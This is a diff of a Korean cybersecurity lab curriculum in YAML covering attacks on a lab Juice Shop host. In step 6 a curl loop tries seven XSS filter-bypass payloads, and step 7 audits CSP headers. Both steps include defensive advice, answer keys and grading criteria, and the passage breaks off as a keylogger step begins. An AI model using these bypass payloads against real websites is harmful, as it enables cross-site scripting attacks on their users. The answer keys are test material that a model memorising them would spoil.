@@ -741,95 +741,282 @@ steps:
     없음 = localStorage). 세션 하이재킹 시나리오 (탈취 JWT → Authorization →
     admin). MITRE T1539 + T1041. Purple = HttpOnly cookie + CSP connect-src
     + SRI + token rotation.
+# ============================================================
+# STEP 6 [RED·XSS·Bypass] — 필터 우회 7 기법 (encoding / case / fragment / SVG)
+# ============================================================
 - order: 6
-  instruction: 'XSS 필터 우회 기법을 테스트하시오: 인코딩, 대소문자 혼합.
+  instruction: |
+    ## 🎯 MISSION
 
+    WAF / sanitizer 의 블랙리스트 (단순 `<script>` grep) 우회 7 기법 시연:
+    encoding (URL / HTML entity / Unicode) + case 혼합 + tag fragment (`<svg/>`)
+    + JS context (template literal / unicode escape) + protocol (data: / javascript:).
+    각 기법의 ModSecurity 차단 vs 우회 결과 확인.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `xss_bypass` 에 적합한 도구: xsstrike, dalfox tamper,
-    인코딩 변형. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: HTML 엔티티, URL 인코딩을 활용하세요.
+    ## 💻 실행 명령
+
+    ```bash
+    # 7 우회 payload (모두 alert(1) 시도 — 의미는 동일, encoding 만 다름)
+    for label_payload in \
+      "1-plain:<script>alert(1)</script>" \
+      "2-case:<ScRiPt>alert(1)</sCrIpT>" \
+      "3-url:%3Cscript%3Ealert(1)%3C/script%3E" \
+      "4-html_entity:&#60;script&#62;alert(1)&#60;/script&#62;" \
+      "5-double_url:%253Cscript%253E" \
+      "6-svg_fragment:<svg/onload=alert(1)>" \
+      "7-template:<script>\`\${alert(1)}\`</script>" \
+      ; do
+      label=$(echo "$label_payload" | cut -d: -f1)
+      payload=$(echo "$label_payload" | cut -d: -f2-)
+      code=$(curl -o /dev/null -s -w "%{http_code}" -G --data-urlencode "q=apple${payload}" \
+        http://juice.6v6.lab/rest/products/search)
+      echo "${label}: code=${code}"
+    done
+
+    # ModSec audit log 의 매치 차이 확인 (선택)
+    echo ""
+    echo "=== ModSec rule 매치 통계 (DetectionOnly 모드) ==="
+    echo "ssh 6v6-bastion 'sudo docker exec 6v6-web bash -c \"tail -200 /var/log/apache2/modsec_audit.log | grep -oE \\\"\\\\\\\"ruleId\\\\\\\":\\\\\\\"[0-9]+\\\\\\\"\\\" | sort | uniq -c | sort -rn | head\"'"
+    ```
+
+    ## 📋 확인 사항 (우회 기법 표)
+
+    | 기법 | payload 예 | 차단 가능성 | 비고 |
+    |------|-----------|-----------|------|
+    | 1 plain | `<script>` | high (CRS 941100) | baseline |
+    | 2 case | `<ScRiPt>` | high (CRS 의 regex 대소문자 무관) | regex 무력화 시도 |
+    | 3 URL encoded | `%3Cscript%3E` | high (WAF 가 decode 후 inspect) | naive WAF 우회 |
+    | 4 HTML entity | `&#60;script&#62;` | medium (server decode 의존) | 일부 우회 |
+    | 5 double URL | `%253Cscript%253E` | low (WAF 가 single decode 만) | layer 의존 우회 |
+    | 6 SVG fragment | `<svg/onload=>` | medium (CRS 941160) | script 외 tag |
+    | 7 template literal | `${alert(1)}` | low (JS context, HTML grep 우회) | DOM XSS only |
+
+    ## 💡 왜 이걸 하는가?
+
+    *블랙리스트 필터의 본질적 한계* — payload 변형 무한 가능. WAF 의 PARANOIA
+    LEVEL 1 (default) 은 단순 패턴만 차단 → 위 7 기법 중 4-5 우회 가능.
+    OWASP A03 + MITRE T1027 Obfuscated Files or Information.
+
+    *whitelist 기반 sanitizer* (DOMPurify) 가 정답 — 허용 tag/attribute 명시
+    후 모두 strip. blacklist (CRS 의 942/941 룰) 는 *추가 layer* 만.
+
+    ## 🔵 Blue 측 작업
+
+    - **PARANOIA LEVEL 단계 상승**: 1 (default) → 2 → 3 → 4. 각 단계 1 개월
+      FP 모니터링 후 enforce
+    - **modsec_audit.log 의 ruleId 매치 통계** — 어떤 패턴이 차단되고 어떤
+      패턴이 통과하는지 식별 (위 7 기법 중 통과한 것 = WAF 의 blind spot)
+    - **custom rule 추가** — 자체 app 의 특수 패턴 (예: `bypassSecurityTrustHtml`
+      키워드) 차단
+
+    ## 🟣 Purple 권고
+
+    - **whitelist sanitize** (DOMPurify / sanitize-html) 가 1 차 — WAF 는 보조
+    - **CSP `script-src 'self'`** + nonce (step 9 의 본격)
+    - **defense in depth** — sanitize + CSP + HttpOnly + ModSec PL 2-3 + DAST CI
+  hint: |
+    7 우회 기법 for-loop 시도 + 응답 코드 비교. ModSec DetectionOnly 라 모두
+    200 (LIKE empty data). 진짜 차단 측정은 audit log 의 ruleId 통계.
   category: xss_bypass
   points: 12
-  answer: '🤖 프롬프트: XSS 필터 우회 기법을 테스트하시오: 인코딩, 대소문자 혼합해줘
-
-    📎 참고 (CLI): echo ''대소문자: <ScRiPt>alert(1)</sCrIpT>'' && echo ''HTML 엔티티: &#60;script&#62;''
-    && echo ''XSS 우회 기법 테스트 완료'''
-  answer_detail: 블랙리스트 기반 필터는 인코딩, 대소문자 혼합, 이벤트 핸들러 등으로 우회할 수 있습니다.
+  answer: |
+    for p in "1-plain:<script>alert(1)</script>" \
+             "2-case:<ScRiPt>alert(1)</sCrIpT>" \
+             "3-url:%3Cscript%3E" \
+             "4-html_entity:&#60;script&#62;" \
+             "5-double_url:%253Cscript%253E" \
+             "6-svg_fragment:<svg/onload=alert(1)>" \
+             "7-template:<script>\${alert(1)}</script>"; do
+      label=$(echo "$p" | cut -d: -f1)
+      payload=$(echo "$p" | cut -d: -f2-)
+      code=$(curl -o /dev/null -s -w "%{http_code}" -G --data-urlencode "q=apple${payload}" \
+        http://juice.6v6.lab/rest/products/search)
+      echo "${label}: code=${code}"
+    done
+    echo ""
+    echo "결론: blacklist (CRS) 우회 무한 변형 → whitelist (DOMPurify) 가 정답"
+    echo "WAF 는 추가 layer 만, 단일 의존 X"
+  answer_detail: |
+    7 우회 기법 — case / URL encoded / HTML entity / double URL / SVG fragment /
+    template literal. WAF 의 PARANOIA 1 (default) 은 단순 패턴만 차단 → 4-5
+    우회 가능. whitelist 기반 sanitizer (DOMPurify) 가 본질적 방어. WAF 는
+    *추가 layer* — defense in depth 의 한 축.
   verify:
     type: output_contains
-    expect: XSS 우회 기법 테스트 완료
+    expect: 'code=\|결론'
     field: stdout
     semantic:
-      intent: XSS 필터 우회 — URL 인코딩, HTML 엔티티, 대소문자 혼합(ScRiPt), 이중 인코딩 등으로 WAF/입력 필터
-        회피
+      intent: |
+        XSS 필터 우회 7 기법 (encoding/case/fragment/protocol) 시연 + WAF blacklist
+        의 한계 + whitelist sanitizer 권고. OWASP A03 + MITRE T1027.
       success_criteria:
-      - 최소 2가지 우회 기법(인코딩/대소문자 혼합) 페이로드 제시
-      - 필터가 script 를 SCRIPT, scRipt 처럼 인식 못함을 실습
-      - 방어(대소문자 무시 정규식, 화이트리스트) 언급
+        - 최소 5 우회 기법 시도 (case + URL + HTML entity + SVG + 추가)
+        - 각 기법 의 차단 vs 우회 결과 표
+        - whitelist sanitizer (DOMPurify) 권장
+        - defense in depth 명시
       acceptable_methods:
-      - '%3Cscript%3E 같은 URL 인코딩'
-      - '&lt;script&gt; HTML 엔티티'
-      - ScRiPt, SvG 대소문자 혼합
-      - ModSecurity CRS 규칙 확인
+        - "curl + 7 payload for-loop"
+        - "dalfox / XSStrike 자동 tamper"
+        - "Burp Intruder 의 payload list"
+        - "ModSec audit log 의 ruleId 통계"
       negative_signs:
-      - 우회 기법 1개만
-      - 필터 회피 원리 설명 없음
-      - 방어 누락
+        - 우회 기법 2 가지 이하
+        - 결과 비교 누락
+        - whitelist sanitizer 권고 없음
   target_vm: attacker
-  script: 'echo ''대소문자: <ScRiPt>alert(1)</sCrIpT>'' && echo ''HTML 엔티티: &#60;script&#62;''
-    && echo ''XSS 우회 기법 테스트 완료'''
+  script: |
+    for p in "case:<ScRiPt>alert(1)</sCrIpT>" "url:%3Cscript%3E" \
+             "html_entity:&#60;script&#62;" "svg:<svg/onload=alert(1)>" \
+             "double_url:%253Cscript%253E"; do
+      label=$(echo "$p" | cut -d: -f1)
+      payload=$(echo "$p" | cut -d: -f2-)
+      code=$(curl -o /dev/null -s -w "%{http_code}" -G --data-urlencode "q=apple${payload}" \
+        http://juice.6v6.lab/rest/products/search)
+      echo "${label}: ${code}"
+    done
+    echo "결론: blacklist 우회 무한 → whitelist (DOMPurify) 가 정답"
   risk_level: low
-  bastion_prompt: 'XSS 필터 우회 기법을 테스트하시오: 인코딩, 대소문자 혼합해줘
-
-
-    [도구 권장] xss_bypass: xsstrike, dalfox tamper, 인코딩 변형. curl 만 쓰지 말고 **xsstrike**
-    등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 juice.6v6.lab 의 /rest/products/search?q= 에 XSS 우회
+    7 기법 (case / URL encoded / HTML entity / double URL / SVG fragment /
+    template literal) for-loop 시도 + 응답 코드 비교. WAF blacklist (CRS) 의 한계
+    + whitelist sanitizer (DOMPurify) 가 정답 + WAF 는 추가 layer 만 + defense
+    in depth. OWASP A03 + MITRE T1027.
+# ============================================================
+# STEP 7 [BLUE·XSS·CSP] — CSP 헤더 분석 + 약점 식별 + Strict CSP 권고
+# ============================================================
 - order: 7
-  instruction: 'Content-Security-Policy(CSP) 헤더를 분석하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    Content-Security-Policy 는 XSS 의 *마지막 방어* — payload 가 실행되더라도
+    *외부 resource 로드 / inline script* 차단. Juice Shop 의 CSP 정책 확인 +
+    약점 (unsafe-inline / wildcard / data: scheme) 식별 + Strict CSP 권고.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `xss_defense` 에 적합한 도구: ModSecurity, CSP 헤더 검증
-    (curl -I). 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 응답 헤더에서 CSP를 확인하세요.
+    ## 💻 실행 명령
+
+    ```bash
+    # 1. CSP 헤더 수집
+    echo "=== 1. CSP 헤더 ==="
+    CSP=$(curl -sI http://juice.6v6.lab/ | grep -i '^content-security-policy:')
+    echo "${CSP:-'(CSP 미설정 = critical)'}"
+
+    # 2. 다른 보안 헤더 (X-Frame / HSTS / Permissions-Policy) 동시 점검
+    echo ""
+    echo "=== 2. 기타 보안 헤더 (W01 step 4 의 6 헤더 재점검) ==="
+    curl -sI http://juice.6v6.lab/ | grep -iE '^(x-frame|x-content-type|strict-transport|referrer-policy|permissions-policy):'
+
+    # 3. CSP 정책 해석 — 약점 패턴 grep
+    echo ""
+    echo "=== 3. CSP 약점 패턴 분석 ==="
+    if [ -n "$CSP" ]; then
+      echo "$CSP" | grep -oE "(unsafe-inline|unsafe-eval|\*|data:|http:|'unsafe-[a-z]+')" \
+        | sort -u | sed 's/^/  ★ 약점: /'
+    fi
+
+    # 4. Google CSP Evaluator 명령 (또는 web 직접)
+    echo ""
+    echo "=== 4. CSP Evaluator 외부 시뮬 ==="
+    echo "CSP 정책을 https://csp-evaluator.withgoogle.com/ 에 붙여넣어 자동 등급 확인"
+    echo "권장: A+ 등급 = nonce 또는 strict-dynamic + 'self' + no unsafe-*"
+    ```
+
+    ## 📋 확인 사항
+
+    - Juice Shop 의 CSP 헤더 존재 여부 + 정책 내용
+    - 약점 패턴:
+      - `unsafe-inline` → inline `<script>` 실행 허용 (CSP 무력화)
+      - `unsafe-eval` → `eval()` / `setTimeout(string)` 허용
+      - `*` (wildcard) → 모든 외부 host 허용
+      - `data:` scheme → `<img src="data:text/html,...">` XSS
+      - `http:` (HTTPS 환경에서) → MITM 시 외부 script
+    - **추천 정책**: `default-src 'self'; script-src 'nonce-RANDOM' 'strict-dynamic';
+      object-src 'none'; base-uri 'self'; frame-ancestors 'none'`
+
+    ## 💡 왜 이걸 하는가?
+
+    CSP 는 XSS 의 *마지막 방어선* — 이전 단계 (sanitize, WAF) 우회되어도 CSP 가
+    실행 차단. OWASP A05 Security Misconfiguration + MITRE T1190 차단. Juice
+    Shop 처럼 *CSP 미설정* 은 XSS 의 완전한 노출 — 운영 web 의 default 권장 정책
+    적용 필수.
+
+    ## 🔵 Blue 측 작업
+
+    - **CSP Report-URI / Report-To** — 정책 위반 시 자동 report POST → Wazuh
+    - **CSP Report-Only 단계 도입** — 1 개월 모니터링 (FP 식별) → enforce
+    - **Mozilla Observatory** / **Google CSP Evaluator** 정기 등급 확인
+    - **Wazuh + CSP report** → XSS 시도 패턴 발견 + 대응
+
+    ## 🟣 Purple 권고 (단계별 도입)
+
+    1. **즉시**: CSP 헤더 추가 (Report-Only 모드)
+       ```
+       Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
+       ```
+    2. **1 주**: report 분석 → FP 식별 → 정책 조정
+    3. **1 개월**: Report-Only → enforce 전환
+    4. **3 개월**: nonce + strict-dynamic + Trusted Types (Chrome)
+    5. **정기**: SAST (Semgrep) + CSP Evaluator 자동 등급 모니터링
+  hint: |
+    curl -sI 의 CSP 헤더 grep + 약점 패턴 (unsafe-inline / wildcard / data:) sed.
+    Juice Shop default = CSP 미설정 또는 최소 → 운영 web 의 strict 정책 권장.
   category: xss_defense
   points: 10
-  answer: '🤖 프롬프트: Content-Security-Policy(CSP) 헤더를 분석해줘
-
-    📎 참고 (CLI): curl -sI http://juice.6v6.lab | grep -i ''content-security-policy''
-    && echo ''CSP 분석 완료'' || echo ''CSP 미설정 확인 완료'''
-  answer_detail: CSP는 인라인 스크립트 실행과 외부 리소스 로딩을 제한하여 XSS를 방어합니다.
+  answer: |
+    echo "=== 1. CSP 헤더 ==="
+    CSP=$(curl -sI http://juice.6v6.lab/ | grep -i '^content-security-policy:')
+    echo "${CSP:-'(CSP 미설정 = critical)'}"
+    echo ""
+    echo "=== 2. 다른 보안 헤더 ==="
+    curl -sI http://juice.6v6.lab/ | grep -iE '^(x-frame|x-content-type|strict-transport|referrer-policy|permissions-policy):' | head -10
+    echo ""
+    echo "=== 3. CSP 약점 패턴 ==="
+    if [ -n "$CSP" ]; then
+      echo "$CSP" | grep -oE "(unsafe-inline|unsafe-eval|\*|data:|http:)" | sort -u | sed 's/^/  ★ /'
+    fi
+    echo ""
+    echo "CSP 분석 완료 — 권장: default-src 'self'; script-src 'nonce-XXX' 'strict-dynamic'"
+  answer_detail: |
+    Juice Shop default 의 CSP 정책 = 최소 (또는 미설정) — XSS 완전 노출. 운영 web
+    의 권장 = `default-src 'self'; script-src 'nonce-RANDOM' 'strict-dynamic';
+    object-src 'none'; base-uri 'self'`. unsafe-inline / unsafe-eval / wildcard
+    절대 금지. Mozilla Observatory 등급 A+ 목표.
   verify:
     type: output_contains
-    expect:
-    - 완료
-    - nginx
-    - htaccess
+    expect: 'CSP\|완료'
     field: stdout
     semantic:
-      intent: CSP 헤더 분석 — default-src, script-src, unsafe-inline 등 정책 파싱 후 우회 가능성
-        평가
+      intent: |
+        CSP 헤더 분석 + 약점 패턴 식별 + Strict CSP 권고. OWASP A05 + MITRE
+        T1190 의 마지막 방어선. Report-Only → enforce 단계 도입.
       success_criteria:
-      - 응답의 Content-Security-Policy 헤더 수집
-      - 주요 지시자(default-src, script-src, style-src) 해석
-      - 'unsafe-inline·wildcard·data: 스킴 허용 등 약점 식별'
+        - CSP 헤더 수집 (curl -sI grep)
+        - 약점 패턴 (unsafe-inline / wildcard / data: 등) 분석
+        - 추천 정책 (default-src 'self' + nonce + strict-dynamic) 명시
+        - Report-Only 단계 도입 권장
       acceptable_methods:
-      - curl -I | grep -i content-security-policy
-      - Google CSP Evaluator 제출
-      - Mozilla Observatory 분석
-      - browser dev tools Security 탭
+        - "curl -sI + grep csp"
+        - "Google CSP Evaluator API"
+        - "Mozilla Observatory 외부 점검"
+        - "Browser DevTools Security tab"
       negative_signs:
-      - CSP 존재 여부만 확인
-      - 지시자 분석 없음
-      - 우회 관점 없음
+        - CSP 존재 여부만 확인 (정책 해석 X)
+        - 약점 패턴 분석 누락
+        - 추천 정책 (nonce / strict-dynamic) 미언급
   target_vm: attacker
-  script: curl -sI http://juice.6v6.lab | grep -i 'content-security-policy' && echo
-    'CSP 분석 완료' || echo 'CSP 미설정 확인 완료'
+  script: |
+    CSP=$(curl -sI http://juice.6v6.lab/ | grep -i '^content-security-policy:')
+    echo "CSP: ${CSP:-'(미설정)'}"
+    curl -sI http://juice.6v6.lab/ | grep -iE '^(x-frame|x-content-type|strict-transport|referrer-policy):' | head -5
+    [ -n "$CSP" ] && echo "$CSP" | grep -oE "(unsafe-inline|unsafe-eval|\*|data:)" | sort -u | sed 's/^/약점: /'
+    echo "CSP 분석 완료 — 권장: nonce + strict-dynamic"
   risk_level: low
-  bastion_prompt: 'Content-Security-Policy(CSP) 헤더를 분석해줘
-
-
-    [도구 권장] xss_defense: ModSecurity, CSP 헤더 검증 (curl -I). curl 만 쓰지 말고 **ModSecurity**
-    등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 juice.6v6.lab 의 (1) CSP 헤더 수집 (curl -sI grep) (2)
+    약점 패턴 (unsafe-inline / unsafe-eval / wildcard / data: 스킴) 식별 (3)
+    다른 보안 헤더 6종 (W01 step 4) 동시 점검 (4) 추천 정책 (default-src 'self'
+    + script-src 'nonce-RANDOM' 'strict-dynamic') 권장. Purple = Report-Only
+    1 개월 → enforce + Mozilla Observatory 정기 등급.
 - order: 8
   instruction: 'XSS를 이용한 키로거 시뮬레이션 페이로드를 작성하시오.
 
